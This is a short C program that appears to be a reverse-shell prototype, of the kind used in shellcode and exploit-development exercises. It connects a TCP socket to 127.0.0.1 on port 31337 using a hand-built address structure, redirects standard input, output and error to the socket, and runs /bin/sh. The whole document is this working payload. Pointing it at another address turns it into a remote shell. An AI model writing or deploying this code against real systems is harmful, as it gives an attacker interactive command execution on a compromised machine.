int main(void)
{
  int sd;
  char *servaddr =  "\x02\x00"             //  Address family (AF_INET)
                    "\x7A\x69"             //  port 31337
                    "\x7F\x00\x00\x01"     //  127.0.0.1
                    "\x00\x00\x00\x00"
                    "\x00\x00\x00\x00";
  sd = socket(2, 1, 0);
  connect(sd, servaddr, 16);

  dup2(sd, 0);
  dup2(sd, 1);
  dup2(sd, 2);
  execve("/bin/sh", 0, 0);
}

